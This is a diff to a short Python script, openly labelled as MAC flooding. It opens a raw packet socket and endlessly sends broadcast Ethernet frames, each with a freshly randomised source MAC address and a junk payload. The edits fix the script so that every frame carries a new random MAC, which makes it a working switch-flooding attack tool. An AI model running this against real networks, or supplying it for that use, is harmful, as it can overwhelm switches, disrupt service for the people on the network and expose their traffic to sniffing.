@@ -2,23 +2,20 @@ import socket
 import struct
 import random
 
-def random_mac():
-    return ':'.join(['%02x' % random.randint(0, 255) for _ in range(6)])
-
 def main ():
-    interface = "eth0"
+    interface = "eth1"
     dst_mac = bytes.fromhex("ff:ff:ff:ff:ff:ff".replace(":", ""))
-    src_mac = random_mac()
     eth_type = 0x0900
     payload = "garbage value ".encode() * 10
-
-    frame = struct.pack("!6s6sH", dst_mac, src_mac, eth_type) + payload
 
     try:
         with socket.socket(socket.AF_PACKET, socket.SOCK_RAW) as raw_socket:
             raw_socket.bind((interface, 0))
             while True:                                                             
+                src_mac = bytes([random.randint(0,255) for _ in range(6)])
+                frame = struct.pack("!6s6sH", dst_mac, src_mac, eth_type) + payload
                 raw_socket.send(frame)
+                print("Mac flooding has been started....")
     except KeyboardInterrupt:
         print("Stopping MAC flooding...")  
     except Exception as error:
